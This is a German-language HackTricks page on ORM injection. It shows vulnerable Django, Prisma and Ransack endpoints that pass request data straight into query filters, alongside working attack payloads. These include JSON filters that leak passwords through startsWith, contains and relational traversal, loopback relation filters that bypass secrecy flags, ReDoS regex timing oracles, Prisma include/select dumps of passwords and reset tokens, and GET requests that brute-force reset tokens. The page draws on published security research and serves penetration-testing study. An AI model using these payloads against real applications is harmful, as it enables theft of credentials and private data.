# ORM Injection

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Django ORM (Python)

In [**diesem Beitrag**](https://www.elttam.com/blog/plormbing-your-django-orm/) wird erkl√§rt, wie es m√∂glich ist, ein Django ORM anf√§llig zu machen, indem man beispielsweise einen Code wie folgt verwendet:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Einige grundlegende API-Ansicht, an die Benutzer Anfragen senden, um
nach Artikeln zu suchen
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Beachten Sie, wie alle request.data (die ein JSON sein wird) direkt verwendet wird, um **Objekte aus der Datenbank zu filtern**. Ein Angreifer k√∂nnte unerwartete Filter senden, um mehr Daten als erwartet zu leaken.

Beispiele:

* **Login:** Bei einem einfachen Login versuchen, die Passw√∂rter der registrierten Benutzer zu leaken.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Es ist m√∂glich, das Passwort durch Brute-Force zu knacken, bis es geleakt wird.
{% endhint %}

* **Relationales Filtern**: Es ist m√∂glich, Beziehungen zu durchlaufen, um Informationen aus Spalten zu leaken, die nicht einmal f√ºr die Operation erwartet wurden. Zum Beispiel, wenn es m√∂glich ist, Artikel zu leaken, die von einem Benutzer mit diesen Beziehungen erstellt wurden: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Es ist m√∂glich, das Passwort aller Benutzer zu finden, die einen Artikel erstellt haben.
{% endhint %}

* **Viele-zu-viele relationale Filterung**: Im vorherigen Beispiel konnten wir die Passw√∂rter von Benutzern, die keinen Artikel erstellt haben, nicht finden. Durch das Verfolgen anderer Beziehungen ist dies jedoch m√∂glich. Zum Beispiel: Artikel(`created_by`) -\[1..1]-> Autor(`departments`) -\[0..\*]-> Abteilung(`employees`) -\[0..\*]-> Autor(`user`) -\[1..1]-> Benutzer(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
In diesem Fall k√∂nnen wir alle Benutzer in den Abteilungen von Benutzern finden, die Artikel erstellt haben, und dann ihre Passw√∂rter leaken (im vorherigen JSON leaken wir nur die Benutzernamen, aber dann ist es m√∂glich, die Passw√∂rter zu leaken).
{% endhint %}

* **Missbrauch von Django Group und Permission viele-zu-viele Beziehungen mit Benutzern**: Dar√ºber hinaus wird das AbstractUser-Modell verwendet, um Benutzer in Django zu generieren, und standardm√§√üig hat dieses Modell einige **viele-zu-viele Beziehungen mit den Permission- und Group-Tabellen**. Dies ist im Grunde eine Standardmethode, um **auf andere Benutzer von einem Benutzer zuzugreifen**, wenn sie in der **gleichen Gruppe sind oder die gleiche Berechtigung teilen**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Umgehung von Filterbeschr√§nkungen**: Der gleiche Blogbeitrag schlug vor, die Verwendung einiger Filter wie `articles = Article.objects.filter(is_secret=False, **request.data)` zu umgehen. Es ist m√∂glich, Artikel, die is\_secret=True haben, zu dumpen, da wir von einer Beziehung zur Article-Tabelle zur√ºckschleifen k√∂nnen und geheime Artikel aus nicht geheimen Artikeln leaken k√∂nnen, da die Ergebnisse zusammengef√ºhrt werden und das is\_secret-Feld im nicht geheimen Artikel √ºberpr√ºft wird, w√§hrend die Daten aus dem geheimen Artikel geleakt werden.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Durch den Missbrauch von Beziehungen ist es m√∂glich, sogar Filter zu umgehen, die dazu gedacht sind, die angezeigten Daten zu sch√ºtzen.
{% endhint %}

* **Fehler-/Zeitbasiert √ºber ReDoS**: In den vorherigen Beispielen wurde erwartet, unterschiedliche Antworten zu erhalten, wenn die Filterung funktionierte oder nicht, um dies als Orakel zu verwenden. Es k√∂nnte jedoch m√∂glich sein, dass eine Aktion in der Datenbank durchgef√ºhrt wird und die Antwort immer gleich ist. In diesem Szenario k√∂nnte es m√∂glich sein, den Datenbankfehler zu erzeugen, um ein neues Orakel zu erhalten.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
From te same post regarding this vector:

* **SQLite**: Hat standardm√§√üig keinen regexp-Operator (erfordert das Laden einer Drittanbietererweiterung)
* **PostgreSQL**: Hat keinen standardm√§√üigen Regex-Timeout und ist weniger anf√§llig f√ºr Backtracking
* **MariaDB**: Hat keinen Regex-Timeout

## Prisma ORM (NodeJS)

Die folgenden sind [**Tricks, die aus diesem Beitrag extrahiert wurden**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Vollst√§ndige Suchkontrolle**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Angreifer hat vollst√§ndige Kontrolle √ºber alle Prisma-Optionen
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Es ist m√∂glich zu sehen, dass der gesamte JavaScript-Body an Prisma √ºbergeben wird, um Abfragen durchzuf√ºhren.

Im Beispiel aus dem urspr√ºnglichen Beitrag w√ºrde dies alle Beitr√§ge √ºberpr√ºfen, die von jemandem erstellt wurden (jeder Beitrag wird von jemandem erstellt) und auch die Benutzerinformationen dieser Person zur√ºckgeben (Benutzername, Passwort...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
Die folgende Abfrage w√§hlt alle Beitr√§ge aus, die von jemandem mit einem Passwort erstellt wurden, und gibt das Passwort zur√ºck:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Vollst√§ndige Kontrolle √ºber die where-Klausel**:

Lassen Sie uns einen Blick darauf werfen, wo der Angriff die `where`-Klausel steuern kann:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Anf√§llig f√ºr ORM-Leaks
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Es ist m√∂glich, das Passwort der Benutzer direkt zu filtern wie:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
Durch die Verwendung von Operationen wie `startsWith` ist es m√∂glich, Informationen zu leaken.&#x20;
{% endhint %}

* **Umgehung der Filterung bei vielen-zu-vielen relationalen Filtern:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Es ist m√∂glich, nicht ver√∂ffentlichte Artikel durch R√ºckverkn√ºpfung zu den vielen-zu-vielen-Beziehungen zwischen `Category` -\[\*..\*]-> `Article` zu leaken:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Es ist auch m√∂glich, alle Benutzer durch den Missbrauch einiger Loopback-viele-zu-viele-Beziehungen zu leaken:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Error/Timed queries**: Im urspr√ºnglichen Beitrag k√∂nnen Sie eine sehr umfangreiche Reihe von Tests lesen, die durchgef√ºhrt wurden, um die optimale Payload zu finden, um Informationen mit einer zeitbasierten Payload zu leaken. Dies ist:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Wo die `{CONTAINS_LIST}` eine Liste mit 1000 Zeichenfolgen ist, um sicherzustellen, dass die **Antwort verz√∂gert wird, wenn das richtige Leak gefunden wird.**

## **Ransack (Ruby)**

Diese Tricks wurden [**in diesem Beitrag gefunden**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Beachten Sie, dass Ransack 4.0.0.0 jetzt die Verwendung einer expliziten Erlaubenliste f√ºr durchsuchbare Attribute und Assoziationen durchsetzt.**
{% endhint %}

**Anf√§lliges Beispiel:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Beachten Sie, wie die Abfrage durch die vom Angreifer gesendeten Parameter definiert wird. Es war m√∂glich, den R√ºcksetz-Token beispielsweise mit folgendem zu brute-forcen:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
Durch Brute-Forcing und potenziell Beziehungen war es m√∂glich, mehr Daten aus einer Datenbank zu leaken.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
